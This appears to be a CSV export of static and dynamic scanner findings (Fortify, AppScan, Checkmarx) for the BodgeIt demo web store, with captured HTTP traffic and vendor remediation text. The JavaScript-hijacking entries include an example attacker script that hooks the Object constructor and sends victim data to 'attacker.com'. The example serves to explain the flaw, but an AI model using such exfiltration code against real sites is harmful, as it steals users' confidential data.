&lt;!-- Use a script tag to bring in victim's data --&gt; &lt;script src=""http://www.example.com/object.json""&gt;&lt;/script&gt; </pre> The malicious code uses a script tag to include the JSON object in the current page. The web browser will send up the appropriate session cookie with the request. In other words, this request will be handled just as though it had originated from the legitimate application. When the JSON array arrives on the client, it will be evaluated in the context of the malicious page. In order to witness the evaluation of the JSON, the malicious page has redefined the JavaScript function used to create new objects. In this way, the malicious code has inserted a hook that allows it to get access to the creation of each object and transmit the object's contents back to the malicious site. Other attacks might override the default constructor for arrays instead. Applications that are built to be used in a mashup sometimes invoke a callback function at the end of each JavaScript message. The callback function is meant to be defined by another application in the mashup. A callback function makes a JavaScript hijacking attack a trivial affair -- all the attacker has to do is define the function. An application can be mashup-friendly or it can be secure, but it cannot be both. If the user is not logged into the vulnerable site, the attacker can compensate by asking the user to log in and then displaying the legitimate login page for the application. This is not a phishing attack -- the attacker does not gain access to the user's credentials -- so anti-phishing countermeasures will not be able to defeat the attack. More complex attacks could make a series of requests to the application by using JavaScript to dynamically generate script tags. This same technique is sometimes used to create application mashups. The only difference is that, in this mashup scenario, one of the applications involved is malicious.</Content>","Recommendations: <Content>All programs that communicate using JavaScript should take the following defensive measures: 1) Decline malicious requests: Include a hard-to-guess identifier, such as the session identifier, as part of each request that will return JavaScript. This defeats cross-site request forgery attacks by allowing the server to validate the origin of the request. 2) Prevent direct execution of the JavaScript response: Include characters in the response that prevent it from being successfully handed off to a JavaScript interpreter without modification. This prevents an attacker from using a <code>&lt;script&gt;</code> tag to witness the execution of the JavaScript. The best way to defend against JavaScript hijacking is to adopt both defensive tactics. <b>Declining Malicious Requests</b> From the server's perspective, a JavaScript hijacking attack looks like an attempt at cross-site request forgery, and defenses against cross-site request forgery will also defeat JavaScript hijacking attacks. In order to make it easy to detect malicious requests, every request should include a parameter that is hard for an attacker to guess. One approach is to add the session cookie to the request as a parameter. When the server receives such a request, it can check to be certain the session cookie matches the value in the request parameter. Malicious code does not have access to the session cookie (cookies are also subject to the Same Origin Policy), so there is no easy way for the attacker to craft a request that will pass this test. A different secret can also be used in place of the session cookie; as long as the secret is hard to guess and appears in a context that is accessible to the legitimate application and not accessible from a different domain, it will prevent an attacker from making a valid request. Some frameworks run only on the client side. In other words, they are written entirely in JavaScript and have no knowledge about the workings of the server. This implies that they do not know the name of the session cookie. Even without knowing the name of the session cookie, they can participate in a cookie-based defense by adding all of the cookies to each request to the server. <b>Example 2:</b> The following JavaScript fragment outlines this ""blind client"" strategy: <pre> var httpRequest = new XMLHttpRequest(); ... var cookies=""cookies=""+escape(document.cookie); http_request.open('POST', url, true); httpRequest.send(cookies); </pre> The server could also check the HTTP <code>referer</code> header in order to make sure the request has originated from the legitimate application and not from a malicious application. Historically speaking, the <code>referer</code> header has not been reliable, so we do not recommend using it as the basis for any security mechanisms. A server can mount a defense against JavaScript hijacking by responding to only HTTP POST requests and not responding to HTTP GET requests. This is a defensive technique because the <code>&lt;script&gt;</code> tag always uses GET to load JavaScript from external sources. This defense is also error-prone. The use of GET for better performance is encouraged by web application experts. The missing connection between the choice of HTTP methods and security means that, at some point, a programmer may mistake this lack of functionality for an oversight rather than a security precaution and modify the application to respond to GET requests. <b>Preventing Direct Execution of the Response</b> In order to make it impossible for a malicious site to execute a response that includes JavaScript, the legitimate client application can take advantage of the fact that it is allowed to modify the data it receives before executing it, while a malicious application can only execute it using a <code>&lt;script&gt;</code> tag. When the server serializes an object, it should include a prefix (and potentially a suffix) that makes it impossible to execute the JavaScript using a <code>&lt;script&gt;</code> tag. The legitimate client application can remove this extraneous data before running the JavaScript. <b>Example 3:</b> There are many possible implementations of this approach. The following example demonstrates two. First, the server could prefix each message with the statement: <pre> while(1); </pre> Unless the client removes this prefix, evaluating the message will send the JavaScript interpreter into an infinite loop. The client searches for and removes the prefix like this: <pre> var object; var req = new XMLHttpRequest(); req.open(""GET"", ""/object.json"",true); req.onreadystatechange = function () { if (req.readyState == 4) { var txt = req.responseText; if (txt.substr(0,9) == ""while(1);"") { txt = txt.substring(10); } object = eval(""("" + txt + "")""); req = null; } }; req.send(null); </pre> Second, the server can include comment characters around the JavaScript that have to be removed before the JavaScript is sent to <code>eval()</code>. The following JSON object has been enclosed in a block comment: <pre> /* [{""fname"":""Brian"", ""lname"":""Chess"", ""phone"":""6502135600"", ""purchases"":60000.00, ""email"":""brian@fortifysoftware.com"" } ] */ </pre> The client can search for and remove the comment characters like this: <pre> var object; var req = new XMLHttpRequest(); req.open(""GET"", ""/object.json"",true); req.onreadystatechange = function () { if (req.readyState == 4) { var txt = req.responseText; if (txt.substr(0,2) == ""/*"") { txt = txt.substring(2, txt.length - 2); } object = eval(""("" + txt + "")""); req = null; } }; req.send(null); </pre> Any malicious site that retrieves the sensitive JavaScript via a <code>&lt;script&gt;</code> tag will not gain access to the data it contains. Since the 5th edition of EcmaScript it is not possible to poison the JavaScript Array constructor.</Content> Tips: 1.A number of modern web frameworks provide mechanisms for performing validation of user input. Struts and Spring MVC are among them. To highlight the unvalidated sources of input, the HPE Security Fortify Secure Coding Rulepacks dynamically re-prioritize the issues reported by HPE Security Fortify Static Code Analyzer by lowering their probability of exploit and providing pointers to the supporting evidence whenever the framework validation mechanism is in use. We refer to this feature as Context-Sensitive Ranking. To further assist the HPE Security Fortify user with the auditing process, the HPE Security Fortify Software Security Research Group makes available the Data Validation project template that groups the issues into folders based on the validation mechanism applied to their source of input.","","",""
"DemoApps","","Bodgeit","107","Autocomplete HTML Attribute Not Disabled for Password Field","","Low","Open","2015-10-15","IBM Security AppScan Standard","311","Missing Encryption of Sensitive Data","A6","/bodgeit/login.jsp","login.jsp","","http://localhost/bodgeit/login.jsp","","POST /bodgeit/login.jsp HTTP/1.1 Content-Type: application/x-www-form-urlencoded Cookie: JSESSIONID=3763D53CDAE983CDB47BA36052AD7B31 Accept-Language: en-US Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Referer: http://localhost:8080/bodgeit/login.jsp Host: localhost:8080 User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Win64; x64; Trident/4.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Tablet PC 2.0) Content-Length: 19 username=&password= HTTP/1.1 200 OK Server: Apache-Coyote/1.1 Content-Type: text/html;charset=ISO-8859-1 Content-Length: 2538 Date: Thu, 15 Oct 2015 22:20:58 GMT <!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 3.2//EN""> <html> <head> <title>The BodgeIt Store</title> <link href=""style.css"" rel=""stylesheet"" type=""text/css"" /> <script type=""text/javascript"" src=""./js/util.js""></script> </head> <body> <center> <table width=""80%"" class=""border""> <tr BGCOLOR=#C3D9FF> <td align=""center"" colspan=""6""> <H1>The BodgeIt Store</H1> <table width=""100%"" class=\""noborder\""> <tr BGCOLOR=#C3D9FF> <td align=""center"" width=""30%"">&nbsp;</td> <td align=""center"" width=""40%"">We bodge it, so you dont have to!</td> <td align=""center"" width=""30%"" style=""text-align: right"" > Guest user </tr> </table> </td> </tr> <tr> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""home.jsp"">Home</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""about.jsp"">About Us</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""contact.jsp"">Contact Us</a></td> <!-- td align=""center"" width=""16%""><a href=""admin.jsp"">Admin</a></td--> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE> <a href=""login.jsp"">Login</a> </td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""basket.jsp"">Your Basket</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""search.jsp"">Search</a></td> </tr> <tr> <td align=""center"" colspan=""6""> <table width=""100%"" class=""border""> <tr> <td align=""left"" valign=""top"" width=""25%""> <a href=""product.jsp?typeid=6"">Doodahs</a><br/> <a href=""product.jsp?typeid=5"">Gizmos</a><br/> <a href=""product.jsp?typeid=3"">Thingamajigs</a><br/> <a href=""product.jsp?typeid=2"">Thingies</a><br/> <a href=""product.jsp?typeid=7"">Whatchamacallits</a><br/> <a href=""product.jsp?typeid=4"">Whatsits</a><br/> <a href=""product.jsp?typeid=1"">Widgets</a><br/> <br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/> </td> <td valign=""top"" width=""70%""> <p style=""color:red"">You supplied an invalid name or password.</p> <h3>Login</h3> Please enter your credentials: <br/><br/> <form method=""POST""> <center> <table> <tr> <td>Username:</td> <td><input id=""username"" name=""username""></input></td> </tr> <tr> <td>Password:</td> <td><input id=""password"" name=""password"" type=""password""></input></td> </tr> <tr> <td></td> <td><input id=""submit"" type=""submit"" value=""Login""></input></td> </tr> </table> </center> </form> If you dont have an account with us then please <a href=""register.jsp"">Register</a> now for a free account. <br/><br/> </td> </tr> </table> </td> </tr> </table> </center> </body> </html> GET /bodgeit/js/util.js HTTP/1.1 Cookie: JSESSIONID=3763D53CDAE983CDB47BA36052AD7B31 Accept-Language: en-US Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Referer: http://localhost:8080/bodgeit/ Host: localhost:8080 User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Win64; x64; Trident/4.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Tablet PC 2.0) HTTP/1.1 200 OK Server: Apache-Coyote/1.1 Accept-Ranges: bytes ETag: W/""1812-1343669578000"" Last-Modified: Mon, 30 Jul 2012 17:32:58 GMT Content-Type: application/javascript Content-Length: 1812 Date: Thu, 15 Oct 2015 22:20:50 GMT function loadfile(filename){ var filetype = filename.split('.').pop(); switch (filetype){ case ""js"": var insert=document.createElement('script') insert.setAttribute(""type"",""text/javascript"") insert.setAttribute(""src"", filename) break; case 'css': var insert=document.createElement(""link""); insert.setAttribute(""type"", ""text/css"") insert.setAttribute(""href"", filename) insert.setAttribute(""rel"", ""stylesheet"") break; } if (typeof insert!=""undefined"") document.getElementsByTagName(""head"")[0].appendChild(insert); return false; } ////The following is from: //http://stackoverflow.com/questions/316781/how-to-build-query-string-with-javascript function form_to_params( form ) { var output = """"; var length = form.elements.length for( var i = 0; i < length; i++ ) { element = form.elements[i] if(element.tagName == 'TEXTAREA' ) { output += ""|"" + element.name + "":"" + element.value; } else if( element.tagName == 'INPU...","","AppScan has found that a password field does not enforce the disabling of the autocomplete feature.","<fixRecommendations> <fixRecommendation type=""General""> <text>If the ""autocomplete"" attribute is missing in the ""password"" field of the ""input"" element, add it and set it to ""off"".</text> <text>If the ""autocomplete"" attribute is set to ""on"", change it to ""off"".</text> <br></br> <text>For example:</text> <br></br> <text>Vulnerable site:</text> <code> <form action=""AppScan.html"" method=""get""> Username: <input type=""text"" name=""firstname"" /><br /> Password: <input type=""password"" name=""lastname"" /> <input type=""submit"" value=""Submit"" /> <form> </code> <br></br> <text>Non-vulnerable site:</text> <code> <form action=""AppScan.html"" method=""get""> Username: <input type=""text"" name=""firstname"" /><br /> Password: <input type=""password"" name=""lastname"" autocomplete=""off""/> <input type=""submit"" value=""Submit"" /> <form> </code> </fixRecommendation>","","",""
"DemoApps","","Bodgeit","99","Autocomplete HTML Attribute Not Disabled for Password Field","","Low","Open","2015-10-15","IBM Security AppScan Standard","311","Missing Encryption of Sensitive Data","A6","/bodgeit/register.jsp","register.jsp","","http://localhost/bodgeit/register.jsp","","POST /bodgeit/register.jsp HTTP/1.1 Content-Type: application/x-www-form-urlencoded Cookie: JSESSIONID=3763D53CDAE983CDB47BA36052AD7B31 Accept-Language: en-US Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Referer: http://localhost:8080/bodgeit/register.jsp Host: localhost:8080 User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Win64; x64; Trident/4.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Tablet PC 2.0) Content-Length: 31 username=&password1=&password2= HTTP/1.1 200 OK Server: Apache-Coyote/1.1 Content-Type: text/html;charset=ISO-8859-1 Content-Length: 2577 Date: Thu, 15 Oct 2015 22:20:59 GMT <!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 3.2//EN""> <html> <head> <title>The BodgeIt Store</title> <link href=""style.css"" rel=""stylesheet"" type=""text/css"" /> <script type=""text/javascript"" src=""./js/util.js""></script> </head> <body> <center> <table width=""80%"" class=""border""> <tr BGCOLOR=#C3D9FF> <td align=""center"" colspan=""6""> <H1>The BodgeIt Store</H1> <table width=""100%"" class=\""noborder\""> <tr BGCOLOR=#C3D9FF> <td align=""center"" width=""30%"">&nbsp;</td> <td align=""center"" width=""40%"">We bodge it, so you dont have to!</td> <td align=""center"" width=""30%"" style=""text-align: right"" > Guest user </tr> </table> </td> </tr> <tr> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""home.jsp"">Home</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""about.jsp"">About Us</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""contact.jsp"">Contact Us</a></td> <!-- td align=""center"" width=""16%""><a href=""admin.jsp"">Admin</a></td--> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE> <a href=""login.jsp"">Login</a> </td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""basket.jsp"">Your Basket</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""search.jsp"">Search</a></td> </tr> <tr> <td align=""center"" colspan=""6""> <table width=""100%"" class=""border""> <tr> <td align=""left"" valign=""top"" width=""25%""> <a href=""product.jsp?typeid=6"">Doodahs</a><br/> <a href=""product.jsp?typeid=5"">Gizmos</a><br/> <a href=""product.jsp?typeid=3"">Thingamajigs</a><br/> <a href=""product.jsp?typeid=2"">Thingies</a><br/> <a href=""product.jsp?typeid=7"">Whatchamacallits</a><br/> <a href=""product.jsp?typeid=4"">Whatsits</a><br/> <a href=""product.jsp?typeid=1"">Widgets</a><br/> <br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/> </td> <td valign=""top"" width=""70%""> <h3>Register</h3> <p style=""color:red"">You must supply a username of at least 5 characters.</p><br/> Please enter the following details to register with us: <br/><br/> <form method=""POST""> <center> <table> <tr> <td>Username (your email address):</td> <td><input id=""username"" name=""username""></input></td> </tr> <tr> <td>Password:</td> <td><input id=""password1"" name=""password1"" type=""password""></input></td> </tr> <tr> <td>Confirm Password:</td> <td><input id=""password2"" name=""password2"" type=""password""></input></td> </tr> <tr> <td></td> <td><input id=""submit"" type=""submit"" value=""Register""></input></td> </tr> </table> </center> </form> </td> </tr> </table> </td> </tr> </table> </center> </body> </html> GET /bodgeit/js/util.js HTTP/1.1 Cookie: JSESSIONID=3763D53CDAE983CDB47BA36052AD7B31 Accept-Language: en-US Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Referer: http://localhost:8080/bodgeit/ Host: localhost:8080 User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Win64; x64; Trident/4.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Tablet PC 2.0) HTTP/1.1 200 OK Server: Apache-Coyote/1.1 Accept-Ranges: bytes ETag: W/""1812-1343669578000"" Last-Modified: Mon, 30 Jul 2012 17:32:58 GMT Content-Type: application/javascript Content-Length: 1812 Date: Thu, 15 Oct 2015 22:20:50 GMT function loadfile(filename){ var filetype = filename.split('.').pop(); switch (filetype){ case ""js"": var insert=document.createElement('script') insert.setAttribute(""type"",""text/javascript"") insert.setAttribute(""src"", filename) break; case 'css': var insert=document.createElement(""link""); insert.setAttribute(""type"", ""text/css"") insert.setAttribute(""href"", filename) insert.setAttribute(""rel"", ""stylesheet"") break; } if (typeof insert!=""undefined"") document.getElementsByTagName(""head"")[0].appendChild(insert); return false; } ////The following is from: //http://stackoverflow.com/questions/316781/how-to-build-query-string-with-javascript function form_to_params( form ) { var output = """"; var length = form.elements.length for( var i = 0; i < length; i++ ) { element = form.elements[i] if(element.tagName == 'TEXTAREA' ) { output += ""|"" + element.name + "":"" + element.va...","","AppScan has found that a password field does not enforce the disabling of the autocomplete feature.","<fixRecommendations> <fixRecommendation type=""General""> <text>If the ""autocomplete"" attribute is missing in the ""password"" field of the ""input"" element, add it and set it to ""off"".</text> <text>If the ""autocomplete"" attribute is set to ""on"", change it to ""off"".</text> <br></br> <text>For example:</text> <br></br> <text>Vulnerable site:</text> <code> <form action=""AppScan.html"" method=""get""> Username: <input type=""text"" name=""firstname"" /><br /> Password: <input type=""password"" name=""lastname"" /> <input type=""submit"" value=""Submit"" /> <form> </code> <br></br> <text>Non-vulnerable site:</text> <code> <form action=""AppScan.html"" method=""get""> Username: <input type=""text"" name=""firstname"" /><br /> Password: <input type=""password"" name=""lastname"" autocomplete=""off""/> <input type=""submit"" value=""Submit"" /> <form> </code> </fixRecommendation>","","",""
"DemoApps","","Bodgeit","276","Not_Using_a_Random_IV_with_CBC_Mode","","Low","Open","2015-10-15","Checkmarx","329","Not Using a Random IV with CBC Mode","","/bodgeit/src/com/thebodgeitstore/util/AES.java","","","http://localhost/bodgeit/src/com/thebodgeitstore/util/AES.java","","","","","","","",""
"DemoApps","","Bodgeit","475","Not_Using_a_Random_IV_with_CBC_Mode","","Low","Open","2015-10-15","Checkmarx","329","Not Using a Random IV with CBC Mode","","/bodgeit/src/com/thebodgeitstore/util/AES.java","","","http://localhost/bodgeit/src/com/thebodgeitstore/util/AES.java","","","","","","","",""
"DemoApps","","Bodgeit","587","Not_Using_a_Random_IV_with_CBC_Mode","","Low","Open","2015-10-15","Checkmarx","329","Not Using a Random IV with CBC Mode","","/bodgeit/src/com/thebodgeitstore/util/AES.java","","","http://localhost/bodgeit/src/com/thebodgeitstore/util/AES.java","","","","","","","",""
"DemoApps","","Bodgeit","198","JavaScript Hijacking: Vulnerable Framework","","Low","Open","2015-10-15","Fortify SCA","346","Origin Validation Error","","root/js/jquery-1.6.4.min.js","","","http://localhost/root/js/jquery-1.6.4.min.js","","","","Abstract: <Content>Applications that use JavaScript notation to transport sensitive data can be vulnerable to JavaScript hijacking, which allows an unauthorized attacker to read confidential data from a vulnerable application.</Content> Explanation: <Content>An application may be vulnerable to JavaScript hijacking if it: 1) Uses JavaScript objects as a data transfer format 2) Handles confidential data. Because JavaScript hijacking vulnerabilities do not occur as a direct result of a coding mistake, the HPE Security Fortify Secure Coding Rulepacks call attention to potential JavaScript hijacking vulnerabilities by identifying code that appears to generate JavaScript in an HTTP response. Web browsers enforce the Same Origin Policy in order to protect users from malicious websites. The Same Origin Policy requires that, in order for JavaScript to access the contents of a web page, both the JavaScript and the web page must originate from the same domain. Without the Same Origin Policy, a malicious website could serve up JavaScript that loads sensitive information from other websites using a client's credentials, culls through it, and communicates it back to the attacker. JavaScript hijacking allows an attacker to bypass the Same Origin Policy in the case that a web application uses JavaScript to communicate confidential information. The loophole in the Same Origin Policy is that it allows JavaScript from any website to be included and executed in the context of any other website. Even though a malicious site cannot directly examine any data loaded from a vulnerable site on the client, it can still take advantage of this loophole by setting up an environment that allows it to witness the execution of the JavaScript and any relevant side effects it may have. Since many Web 2.0 applications use JavaScript as a data transport mechanism, they are often vulnerable while traditional web applications are not. The most popular format for communicating information in JavaScript is JavaScript Object Notation (JSON). The JSON RFC defines JSON syntax to be a subset of JavaScript object literal syntax. JSON is based on two types of data structures: arrays and objects. Any data transport format where messages can be interpreted as one or more valid JavaScript statements is vulnerable to JavaScript hijacking. JSON makes JavaScript hijacking easier by the fact that a JSON array stands on its own as a valid JavaScript statement. Since arrays are a natural form for communicating lists, they are commonly used wherever an application needs to communicate multiple values. Put another way, a JSON array is directly vulnerable to JavaScript hijacking. A JSON object is only vulnerable if it is wrapped in some other JavaScript construct that stands on its own as a valid JavaScript statement. <b>Example 1:</b> The following example begins by showing a legitimate JSON interaction between the client and server components of a web application used to manage sales leads. It goes on to show how an attacker can mimic the client and gain access to the confidential data the server returns. Note that this example is written for Mozilla-based browsers. Other mainstream browsers do not allow native constructors to be overridden when an object is created without the use of the new operator. The client requests data from a server and evaluates the result as JSON with the following code: <pre> var object; var req = new XMLHttpRequest(); req.open(""GET"", ""/object.json"",true); req.onreadystatechange = function () { if (req.readyState == 4) { var txt = req.responseText; object = eval(""("" + txt + "")""); req = null; } }; req.send(null); </pre> When the code runs, it generates an HTTP request that looks like this: <pre> GET /object.json HTTP/1.1 ... Host: www.example.com Cookie: JSESSIONID=F2rN6HopNzsfXFjHX1c5Ozxi0J5SQZTr4a5YJaSbAiTnRR </pre> (In this HTTP response and the one that follows we have elided HTTP headers that are not directly relevant to this explanation.) The server responds with an array in JSON format: <pre> HTTP/1.1 200 OK Cache-control: private Content-Type: text/JavaScript; charset=utf-8 ... [{""fname"":""Brian"", ""lname"":""Chess"", ""phone"":""6502135600"", ""purchases"":60000.00, ""email"":""brian@fortifysoftware.com"" }, {""fname"":""Katrina"", ""lname"":""O'Neil"", ""phone"":""6502135600"", ""purchases"":120000.00, ""email"":""katrina@fortifysoftware.com"" }, {""fname"":""Jacob"", ""lname"":""West"", ""phone"":""6502135600"", ""purchases"":45000.00, ""email"":""jacob@fortifysoftware.com"" }] </pre> In this case, the JSON contains confidential information associated with the current user (a list of sales leads). Other users cannot access this information without knowing the user's session identifier. (In most modern web applications, the session identifier is stored as a cookie.) However, if a victim visits a malicious website, the malicious site can retrieve the information using JavaScript hijacking. If a victim can be tricked into visiting a web page that contains the following malicious code, the victim's lead information will be sent to the attacker's web site. <pre> &lt;script&gt; // override the constructor used to create all objects so // that whenever the ""email"" field is set, the method // captureObject() will run. Since ""email"" is the final field, // this will allow us to steal the whole object. function Object() { this.email setter = captureObject; } // Send the captured object back to the attacker's web site function captureObject(x) { var objString = """"; for (fld in this) { objString += fld + "": "" + this[fld] + "", ""; } objString += ""email: "" + x; var req = new XMLHttpRequest(); req.open(""GET"", ""http://attacker.com?obj="" + escape(objString),true); req.send(null); } &lt;/script&gt; &lt;!-- Use a script tag to bring in victim's data --&gt; &lt;script src=""http://www.example.com/object.json""&gt;&lt;/script&gt; </pre> The malicious code uses a script tag to include the JSON object in the current page. The web browser will send up the appropriate session cookie with the request. In other words, this request will be handled just as though it had originated from the legitimate application. When the JSON array arrives on the client, it will be evaluated in the context of the malicious page. In order to witness the evaluation of the JSON, the malicious page has redefined the JavaScript function used to create new objects. In this way, the malicious code has inserted a hook that allows it to get access to the creation of each object and transmit the object's contents back to the malicious site. Other attacks might override the default constructor for arrays instead. Applications that are built to be used in a mashup sometimes invoke a callback function at the end of each JavaScript message. The callback function is meant to be defined by another application in the mashup. A callback function makes a JavaScript hijacking attack a trivial affair -- all the attacker has to do is define the function. An application can be mashup-friendly or it can be secure, but it cannot be both. If the user is not logged into the vulnerable site, the attacker can compensate by asking the user to log in and then displaying the legitimate login page for the application. This is not a phishing attack -- the attacker does not gain access to the user's credentials -- so anti-phishing countermeasures will not be able to defeat the attack. More complex attacks could make a series of requests to the application by using JavaScript to dynamically generate script tags. This same technique is sometimes used to create application mashups. The only difference is that, in this mashup scenario, one of the applications involved is malicious.</Content>","Recommendations: <Content>All programs that communicate using JavaScript should take the following defensive measures: 1) Decline malicious requests: Include a hard-to-guess identifier, such as the session identifier, as part of each request that will return JavaScript. This defeats cross-site request forgery attacks by allowing the server to validate the origin of the request. 2) Prevent direct execution of the JavaScript response: Include characters in the response that prevent it from being successfully handed off to a JavaScript interpreter without modification. This prevents an attacker from using a <code>&lt;script&gt;</code> tag to witness the execution of the JavaScript. The best way to defend against JavaScript hijacking is to adopt both defensive tactics. <b>Declining Malicious Requests</b> From the server's perspective, a JavaScript hijacking attack looks like an attempt at cross-site request forgery, and defenses against cross-site request forgery will also defeat JavaScript hijacking attacks. In order to make it easy to detect malicious requests, every request should include a parameter that is hard for an attacker to guess. One approach is to add the session cookie to the request as a parameter. When the server receives such a request, it can check to be certain the session cookie matches the value in the request parameter. Malicious code does not have access to the session cookie (cookies are also subject to the Same Origin Policy), so there is no easy way for the attacker to craft a request that will pass this test. A different secret can also be used in place of the session cookie; as long as the secret is hard to guess and appears in a context that is accessible to the legitimate application and not accessible from a different domain, it will prevent an attacker from making a valid request. Some frameworks run only on the client side. In other words, they are written entirely in JavaScript and have no knowledge about the workings of the server. This implies that they do not know the name of the session cookie. Even without knowing the name of the session cookie, they can participate in a cookie-based defense by adding all of the cookies to each request to the server. <b>Example 2:</b> The following JavaScript fragment outlines this ""blind client"" strategy: <pre> var httpRequest = new XMLHttpRequest(); ... var cookies=""cookies=""+escape(document.cookie); http_request.open('POST', url, true); httpRequest.send(cookies); </pre> The server could also check the HTTP <code>referer</code> header in order to make sure the request has originated from the legitimate application and not from a malicious application. Historically speaking, the <code>referer</code> header has not been reliable, so we do not recommend using it as the basis for any security mechanisms. A server can mount a defense against JavaScript hijacking by responding to only HTTP POST requests and not responding to HTTP GET requests. This is a defensive technique because the <code>&lt;script&gt;</code> tag always uses GET to load JavaScript from external sources. This defense is also error-prone. The use of GET for better performance is encouraged by web application experts. The missing connection between the choice of HTTP methods and security means that, at some point, a programmer may mistake this lack of functionality for an oversight rather than a security precaution and modify the application to respond to GET requests. <b>Preventing Direct Execution of the Response</b> In order to make it impossible for a malicious site to execute a response that includes JavaScript, the legitimate client application can take advantage of the fact that it is allowed to modify the data it receives before executing it, while a malicious application can only execute it using a <code>&lt;script&gt;</code> tag. When the server serializes an object, it should include a prefix (and potentially a suffix) that makes it impossible to execute the JavaScript using a <code>&lt;script&gt;</code> tag. The legitimate client application can remove this extraneous data before running the JavaScript. <b>Example 3:</b> There are many possible implementations of this approach. The following example demonstrates two. First, the server could prefix each message with the statement: <pre> while(1); </pre> Unless the client removes this prefix, evaluating the message will send the JavaScript interpreter into an infinite loop. The client searches for and removes the prefix like this: <pre> var object; var req = new XMLHttpRequest(); req.open(""GET"", ""/object.json"",true); req.onreadystatechange = function () { if (req.readyState == 4) { var txt = req.responseText; if (txt.substr(0,9) == ""while(1);"") { txt = txt.substring(10); } object = eval(""("" + txt + "")""); req = null; } }; req.send(null); </pre> Second, the server can include comment characters around the JavaScript that have to be removed before the JavaScript is sent to <code>eval()</code>. The following JSON object has been enclosed in a block comment: <pre> /* [{""fname"":""Brian"", ""lname"":""Chess"", ""phone"":""6502135600"", ""purchases"":60000.00, ""email"":""brian@fortifysoftware.com"" } ] */ </pre> The client can search for and remove the comment characters like this: <pre> var object; var req = new XMLHttpRequest(); req.open(""GET"", ""/object.json"",true); req.onreadystatechange = function () { if (req.readyState == 4) { var txt = req.responseText; if (txt.substr(0,2) == ""/*"") { txt = txt.substring(2, txt.length - 2); } object = eval(""("" + txt + "")""); req = null; } }; req.send(null); </pre> Any malicious site that retrieves the sensitive JavaScript via a <code>&lt;script&gt;</code> tag will not gain access to the data it contains. Since the 5th edition of EcmaScript it is not possible to poison the JavaScript Array constructor.</Content>","","",""
"DemoApps","","Bodgeit","391","Reliance_on_Cookies_in_a_Decision","","Low","Open","2015-10-15","Checkmarx","784","Reliance on Cookies without Validation and Integrity Checking in a Security Decision","","/bodgeit/root/basket.jsp","","","http://localhost/bodgeit/root/basket.jsp","","","","","","","",""
"DemoApps","","Bodgeit","415","Reliance_on_Cookies_in_a_Decision","","Low","Open","2015-10-15","Checkmarx","784","Reliance on Cookies without Validation and Integrity Checking in a Security Decision","","/bodgeit/root/basket.jsp","","","http://localhost/bodgeit/root/basket.jsp","","","","","","","",""
"DemoApps","","Bodgeit","424","Reliance_on_Cookies_in_a_Decision","","Low","Open","2015-10-15","Checkmarx","784","Reliance on Cookies without Validation and Integrity Checking in a Security Decision","","/bodgeit/root/basket.jsp","","","http://localhost/bodgeit/root/basket.jsp","","","","","","","",""
"DemoApps","","Bodgeit","425","Reliance_on_Cookies_in_a_Decision","","Low","Open","2015-10-15","Checkmarx","784","Reliance on Cookies without Validation and Integrity Checking in a Security Decision","","/bodgeit/root/basket.jsp","","","http://localhost/bodgeit/root/basket.jsp","","","","","","","",""
"DemoApps","","Bodgeit","524","Reliance_on_Cookies_in_a_Decision","","Low","Open","2015-10-15","Checkmarx","784","Reliance on Cookies without Validation and Integrity Checking in a Security Decision","","/bodgeit/root/basket.jsp","","","http://localhost/bodgeit/root/basket.jsp","","","","","","","",""
"DemoApps","","Bodgeit","560","Reliance_on_Cookies_in_a_Decision","","Low","Open","2015-10-15","Checkmarx","784","Reliance on Cookies without Validation and Integrity Checking in a Security Decision","","/bodgeit/root/basket.jsp","","","http://localhost/bodgeit/root/basket.jsp","","","","","","","",""
"DemoApps","","Bodgeit","623","Reliance_on_Cookies_in_a_Decision","","Low","Open","2015-10-15","Checkmarx","784","Reliance on Cookies without Validation and Integrity Checking in a Security Decision","","/bodgeit/root/basket.jsp","","","http://localhost/bodgeit/root/basket.jsp","","","","","","","",""
"DemoApps","","Bodgeit","384","Reliance_on_Cookies_in_a_Decision","","Low","Open","2015-10-15","Checkmarx","784","Reliance on Cookies without Validation and Integrity Checking in a Security Decision","","/bodgeit/root/basket.jsp","productid","","http://localhost/bodgeit/root/basket.jsp","","","","","","","",""
"DemoApps","","Bodgeit","439","Reliance_on_Cookies_in_a_Decision","","Low","Open","2015-10-15","Checkmarx","784","Reliance on Cookies without Validation and Integrity Checking in a Security Decision","","/bodgeit/root/basket.jsp","productid","","http://localhost/bodgeit/root/basket.jsp","","","","","","","",""
